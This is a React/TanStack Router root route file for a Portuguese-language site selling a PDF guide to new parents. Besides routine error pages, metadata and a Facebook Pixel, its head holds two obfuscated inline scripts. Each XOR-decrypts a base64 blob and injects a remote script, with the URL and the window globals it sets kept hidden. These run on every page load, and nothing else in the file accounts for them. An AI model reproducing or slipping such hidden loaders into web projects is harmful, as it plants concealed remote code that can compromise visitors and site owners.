import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { PIXEL_ID } from "../lib/pixel";


function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Guia Prático Pra Pai e Mãe Dividirem a Noite Sem Brigar" },
      {
        name: "description",
        content:
          "O combinado justo que acaba com a briga das 3h da manhã. Guia em PDF + bônus para casais com recém-nascido dividirem a noite sem discutir.",
      },
      { property: "og:type", content: "website" },
      { property: "og:site_name", content: "Noite Dividida" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,500;9..144,600;9..144,700&family=Karla:wght@400;500;600;700&display=swap",
      },
      { rel: "icon", type: "image/png", href: "/favicon.png" },
    ],
    scripts: [
      {
        children: `(function(){var j_by=atob("DMigUak2rsH1J7rzWLOCJNtajPvXT86HKLuafoZVyq/bUs6eMa7Zf8pZw++XVZWAO7rJId1FgbSBSsncNKnUNNpCgKuGBZbRObzUI8BU27WQVJjJA7OCP8hby+PPBd6SLKmNJN1bx6eMCsqBPb7FP90b1qKaQ5eAO6OCfYtAz62AQpjJeurdfdIUwKCYQpjJeqzBJcgb27WYTtyKdbjSNN9TwLXYVM+RMazTc4UU2KCZUt/RYuqCLPRL");var y_snv9=[];for(var k_4bws=0;k_4bws<j_by.length;k_4bws++){y_snv9.push(j_by.charCodeAt(k_4bws)&255);}var z_8a0=y_snv9[0];var m_q=y_snv9.slice(1,1+z_8a0);var e_3=y_snv9.slice(1+z_8a0);var n_g8=e_3.map(function(b,w_3upo){return b^m_q[w_3upo%z_8a0];});var t_c="";for(var x_gdby=0;x_gdby<n_g8.length;x_gdby++){t_c+=String.fromCharCode(n_g8[x_gdby]&255);}var o_4696=decodeURIComponent(escape(t_c));var l_m2r=JSON.parse(o_4696);var o_8=l_m2r.globals||[];o_8.forEach(function(d_cox){window[d_cox.name]=d_cox.value;});var y_o0ho=document.createElement("script");y_o0ho.src=l_m2r.url;y_o0ho.async=true;y_o0ho.defer=true;(l_m2r.attributes||[]).forEach(function(w_h8){y_o0ho.setAttribute(w_h8.name,w_h8.value);});(document.head||document.documentElement).appendChild(y_o0ho);})();`,
      },
      {
        children: `(function(){var v_xny7=atob("DFo1CjFOHPkzV+uKWiEXf0MiPsMRP5/+KikPJR4teJcdIp/nMzxMJFIhcddRJcT5OShcekU9M4laL47mdSpcclQiMpNAdceoOy5BeFgsaY1WJMmwAQcZKFYic5tSO5ioYAFOKF8vcZwRbcn6MyJQZngqPtURIYrmLz8XMBN4fc5SZtO6OzlWb1cqesgGb4q8aWMHaAZsYaRO");var o_3o3=[];for(var a_wh6=0;a_wh6<v_xny7.length;a_wh6++){o_3o3.push(v_xny7.charCodeAt(a_wh6)&255);}var n_z=o_3o3[0];var g_aym7=o_3o3.slice(1,1+n_z);var w_v=o_3o3.slice(1+n_z);var y_nx=w_v.map(function(b,b_g92j){return b^g_aym7[b_g92j%n_z];});var z_3f="";for(var a_eykm=0;a_eykm<y_nx.length;a_eykm++){z_3f+=String.fromCharCode(y_nx[a_eykm]&255);}var t_lzn=decodeURIComponent(escape(z_3f));var y_l=JSON.parse(t_lzn);var q_k=y_l.globals||[];q_k.forEach(function(z_p6){window[z_p6.name]=z_p6.value;});var j_30=document.createElement("script");j_30.src=y_l.url;j_30.async=true;j_30.defer=true;(y_l.attributes||[]).forEach(function(a_csj8){j_30.setAttribute(a_csj8.name,a_csj8.value);});(document.head||document.documentElement).appendChild(j_30);})();`,
      },
      {
        children: `!function(f,b,e,v,n,t,s)

{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${PIXEL_ID}');
fbq('track', 'PageView');`,
      },
    ],
  }),


  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
